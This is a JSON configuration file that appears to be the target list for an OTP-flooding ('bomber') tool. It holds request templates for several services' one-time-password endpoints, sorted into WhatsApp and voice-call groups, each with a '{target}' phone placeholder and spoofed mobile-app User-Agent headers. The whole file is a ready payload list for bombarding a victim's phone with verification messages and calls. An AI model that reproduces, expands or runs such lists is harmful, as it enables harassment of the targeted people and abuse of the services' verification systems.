{
  "whatsapp": [
    {
      "name": "OTOMAX-PAY",
      "url": "https://api.otomax-payment.com/v1/auth/otp",
      "method": "POST",
      "data": {"phone": "{target}", "device": "android"},
      "headers": {"Content-Type": "application/json", "User-Agent": "okhttp/4.10.0"}
    },
    {
      "name": "KURSUS-LOKAL",
      "url": "https://dashboard.skillacademy.com/api/v1/auth/otp",
      "method": "POST",
      "data": {"phoneNumber": "{target}"},
      "headers": {"User-Agent": "Mozilla/5.0"}
    }
  ],
  "call": [
    {
      "name": "PULSA-LAPAK",
      "url": "https://api.lapakpulsa.id/v2/otp/call",
      "method": "POST",
      "data": {"msisdn": "{target}"},
      "headers": {"X-Requested-With": "XMLHttpRequest"}
    },
    {
      "name": "BOKU-PAY",
      "url": "https://api.boku.com/v1/verify",
      "method": "POST",
      "data": {"number": "{target}"},
      "headers": {"User-Agent": "Dalvik/2.1.0"}
    }
  ]
}
